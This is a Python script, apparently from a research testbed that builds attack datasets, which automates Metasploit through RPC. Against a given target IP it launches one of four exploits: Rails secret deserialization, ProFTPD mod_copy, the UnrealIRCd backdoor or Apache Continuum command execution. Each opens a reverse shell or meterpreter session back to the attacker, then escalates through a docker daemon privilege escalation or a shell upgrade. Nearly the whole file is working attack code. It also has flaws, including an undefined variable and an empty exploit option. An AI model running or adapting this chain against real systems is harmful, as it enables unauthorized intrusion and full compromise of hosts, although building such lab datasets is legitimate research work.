import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient
from CREMEapplication.models import AttackScenario

def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip duration".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')
    AS = AttackScenario.objects().all().first()
    FS = getattr(AS, data_theft_FirstStage)
    if(FS.lower() == "rails_secret_deserialization"):
        exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
        payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')
        exploit['RPORT'] = 8181
        exploit['TARGETURI'] = '/'
        exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
        payload['LPORT'] = 4444
    elif(FS.lower() == "proftpd_modcopy_exec"):
        exploit = client.modules.use('exploit', 'unix/ftp/proftpd_modcopy_exec')
        payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
        exploit[''] = '/'
        payload['LPORT'] = 4444
    elif(FS.lower() == "unreal_ircd_3281_backdoor"):
        exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
        payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
        exploit['RPORT'] = 6697
        payload['LPORT'] = 4444
    elif(FS.lower() == "apache_continuum_cmd_exec"):
        exploit = client.modules.use('exploit', 'linux/http/apache_continuum_cmd_exec')
        payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
        
    exploit['RHOSTS'] = target_ip
    payload['LHOST'] = my_ip 

    output_time_file = 'time_stage_1_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)
    # print('Start 1')

    exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    # print(client.sessions.list['1'])
    
    if(FS.lower() == "rails_secret_deserialization" or FS.lower() == "proftpd_modcopy_exec"):
        exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
        exploit['SESSION'] = 1
        exploit.execute()
    elif(FS.lower() == "unreal_ircd_3281_backdoor" or FS.lower() == "apache_continuum_cmd_exec"):
        exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
        payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
        exploit['SESSION'] = 1
        payload['LHOST'] = my_ip
        payload['LPORT'] = 4444
        exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    time.sleep(10)
    output_time_file = 'time_stage_1_end.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)


main(sys.argv)
